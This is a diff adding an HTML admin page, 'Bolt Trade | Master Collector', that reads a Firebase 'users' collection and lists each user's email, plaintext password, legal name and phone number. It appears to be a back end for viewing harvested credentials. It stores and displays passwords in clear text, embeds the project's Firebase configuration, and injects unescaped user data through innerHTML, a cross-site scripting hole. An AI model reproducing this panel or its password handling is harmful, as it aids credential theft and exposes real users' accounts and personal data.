@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Bolt Trade | Master Collector </title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;800&display=swap');
+        
+        body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #020617; color: white; -webkit-tap-highlight-color: transparent; }
+        
+        .gold-text { background: linear-gradient(135deg, #D4AF37 0%, #F9E29C 50%, #B8860B 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        
+        .admin-card { 
+            background: linear-gradient(145deg, rgba(15, 23, 42, 0.9) 0%, rgba(2, 6, 23, 1) 100%); 
+            border: 1px solid rgba(255, 255, 255, 0.05); 
+            border-radius: 2rem; 
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); 
+        }
+        
+        .admin-card:hover { border-color: #D4AF37; transform: scale(1.02); box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
+        
+        .status-badge { background: rgba(34, 197, 94, 0.1); color: #22c55e; padding: 4px 10px; border-radius: 8px; font-size: 9px; font-weight: 800; text-transform: uppercase; border: 1px solid rgba(34, 197, 94, 0.2); }
+        
+        #loader { position: fixed; inset: 0; background: #020617; z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease; }
+        
+        .spinner { width: 50px; height: 50px; border: 3px solid rgba(212, 175, 55, 0.05); border-top-color: #D4AF37; border-radius: 50%; animation: spin 1s cubic-bezier(0.5, 0.1, 0.4, 0.9) infinite; }
+        
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        .back-btn { background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.08); transition: all 0.3s; }
+        .back-btn:active { transform: scale(0.9); background: rgba(212, 175, 55, 0.1); }
+    </style>
+</head>
+<body class="p-4 md:p-8 pb-20">
+
+    <div id="loader">
+        <div class="spinner"></div>
+        <p class="text-[10px] font-black uppercase tracking-[0.5em] mt-8 gold-text animate-pulse">Syncing  Database</p>
+    </div>
+
+    <div class="max-w-5xl mx-auto">
+        <header class="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-12">
+            <div class="flex items-center gap-5">
+                <a href="admin.html" class="back-btn w-12 h-12 rounded-2xl flex items-center justify-center text-gray-400 hover:text-white">
+                    <i class="fas fa-chevron-left"></i>
+                </a>
+                <div>
+                    <h1 class="text-3xl font-black gold-text uppercase tracking-tighter italic">Collector<span class="text-white">.</span></h1>
+                    <div class="flex items-center gap-3 mt-1">
+                        <span class="status-badge"> Access Secured</span>
+                        <p id="totalUsers" class="text-gray-600 text-[9px] font-black uppercase tracking-widest">Calculating Node...</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="flex gap-3">
+                <button onclick="location.reload()" class="flex-1 md:flex-none px-6 h-12 rounded-2xl bg-slate-900 border border-slate-800 flex items-center justify-center gap-2 hover:border-yellow-500 transition-all active:scale-95">
+                    <i class="fas fa-rotate text-xs"></i>
+                    <span class="text-[10px] font-black uppercase tracking-widest">Refresh</span>
+                </button>
+            </div>
+        </header>
+
+        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-2 gap-6" id="userContainer">
+            </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, onSnapshot, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyA3vDwtittQkvW6Bxseutk-ThHFkrF_K0c",
+            authDomain: "boltrade-40812.firebaseapp.com",
+            projectId: "boltrade-40812",
+            storageBucket: "boltrade-40812.firebasestorage.app",
+            messagingSenderId: "682083427899",
+            appId: "1:682083427899:web:07a8f74c04908dc8f8de1e"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
+
+        // LIVE  Real-time Listener
+        function initCollector() {
+            const container = document.getElementById('userContainer');
+            const countLabel = document.getElementById('totalUsers');
+            const loader = document.getElementById('loader');
+            
+            // onSnapshot makes it real-time 
+            onSnapshot(collection(db, "users"), (snap) => {
+                container.innerHTML = "";
+                let count = 0;
+
+                if (snap.empty) {
+                    container.innerHTML = `
+                        <div class="col-span-full py-20 text-center opacity-20">
+                            <i class="fas fa-users-slash text-5xl mb-4"></i>
+                            <p class="font-black uppercase tracking-widest">No Registered  Users</p>
+                        </div>
+                    `;
+                }
+
+                snap.forEach((userDoc) => {
+                    const data = userDoc.data();
+                    count++;
+                    
+                    container.innerHTML += `
+                        <div class="admin-card p-6 relative overflow-hidden group">
+                            <div class="absolute top-0 right-0 p-4 opacity-0 group-hover:opacity-100 transition-opacity">
+                                <button onclick="deleteUserRecord('${userDoc.id}')" class="w-10 h-10 rounded-xl bg-red-500/10 text-red-500 hover:bg-red-500 hover:text-white transition-all flex items-center justify-center">
+                                    <i class="fas fa-trash-alt text-xs"></i>
+                                </button>
+                            </div>
+
+                            <div class="flex items-center gap-4 mb-6">
+                                <div class="w-12 h-12 rounded-2xl bg-yellow-500/10 flex items-center justify-center border border-yellow-500/20">
+                                    <i class="fas fa-user-shield text-yellow-500"></i>
+                                </div>
+                                <div class="flex-1 overflow-hidden">
+                                    <p class="text-[8px] font-black text-blue-500 uppercase tracking-widest mb-0.5"> Node: ${userDoc.id.substring(0,12)}</p>
+                                    <h3 class="text-md font-black text-white truncate">${data.email || 'Anonymous User'}</h3>
+                                </div>
+                            </div>
+                            
+                            <div class="bg-black/40 rounded-2xl p-4 border border-white/5 mb-6">
+                                <div class="flex justify-between items-center">
+                                    <span class="text-[9px] font-black text-gray-500 uppercase">Access Password</span>
+                                    <i class="fas fa-lock text-[9px] text-yellow-500/30"></i>
+                                </div>
+                                <p class="text-sm font-mono text-yellow-500 font-bold tracking-wider mt-1">${data.password || '---'}</p>
+                            </div>
+                            
+                            <div class="grid grid-cols-2 gap-6 pt-4 border-t border-white/5">
+                                <div>
+                                    <p class="text-[8px] font-black text-gray-500 uppercase mb-1 tracking-tighter">Legal Name</p>
+                                    <p class="text-[11px] font-black text-gray-200 uppercase">${data.name || 'NOT SET'}</p>
+                                </div>
+                                <div>
+                                    <p class="text-[8px] font-black text-gray-500 uppercase mb-1 tracking-tighter">Phone Line</p>
+                                    <p class="text-[11px] font-black text-gray-200">${data.phone || 'NOT SET'}</p>
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                });
+
+                countLabel.innerText = `Total  Nodes: ${count}`;
+                loader.style.opacity = '0'; 
+                setTimeout(() => loader.style.display = 'none', 500);
+            }, (err) => {
+                console.error(err);
+                container.innerHTML = `<p class='text-red-500 font-bold text-center py-10'>Database Access Denied </p>`;
+            });
+        }
+
+        window.deleteUserRecord = async (id) => {
+            if(confirm("Permanently wipe this user from  records?")) {
+                try {
+                    await deleteDoc(doc(db, "users", id));
+                } catch(e) {
+                    alert("Wipe failed : " + e.message);
+                }
+            }
+        }
+
+        // Initialize  Feed
+        initCollector();
+    </script>
+</body>
+</html>
